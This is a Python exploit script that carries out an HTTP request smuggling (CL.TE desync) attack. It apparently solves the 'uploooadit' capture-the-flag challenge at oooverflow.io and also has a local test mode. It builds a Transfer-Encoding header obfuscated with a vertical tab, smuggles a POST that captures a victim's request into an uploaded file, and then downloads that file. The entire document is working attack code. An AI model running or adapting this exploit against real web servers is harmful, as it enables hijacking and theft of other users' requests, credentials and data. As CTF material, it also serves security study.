#!/usr/bin/env python3
import socket
import ssl
import sys
import uuid

import requests


CLTE_TEMPLATE = """GET / HTTP/1.1
Host: {hostname}
User-Agent: attacker
Content-Length: {length}
Transfer-Encoding:\x0bchunked

0

"""

GUID = str(uuid.uuid4())


def request(content, hostname, port):
    print(content)
    print()

    def issue_request(server):
        assert server.send(content) == len(content)
        data = server.recv(1024)
        while len(data) > 0:
            print(data.decode("utf-8"))
            data = server.recv(1024)

    with socket.create_connection((hostname, port)) as raw_socket:
        if port == 443:
            context = ssl.create_default_context()
            with context.wrap_socket(raw_socket, server_hostname=hostname) as server:
                issue_request(server)
        else:
            issue_request(raw_socket)
        try:
            raw_socket.shutdown(socket.SHUT_RDWR)
        except:
            pass


def clte(payload, hostname):
    offset = 5 + payload.count("\n")
    return (
        (CLTE_TEMPLATE.format(hostname=hostname, length=len(payload) + offset) + payload)
        .replace("\n", "\r\n")
        .encode("utf-8")
    )


def main():
    if len(sys.argv) == 2 and sys.argv[1] == "--local":
        hostname = "localhost"
        port = 8080
        url = f"http://localhost:8080/files/{GUID}"
    else:
        hostname = "uploooadit.oooverflow.io"
        port = 443
        url = f"https://uploooadit.oooverflow.io/files/{GUID}"

    payload = f"""POST /files/ HTTP/1.1
Connection: close
Content-Length: 385
Content-Type: text/plain
User-Agent: hacked
X-guid: {GUID}

"""

    request(clte(payload, hostname), hostname, port)



    response = requests.get(url)
    print(response.content.decode("utf-8"))


if __name__ == "__main__":
    sys.exit(main())
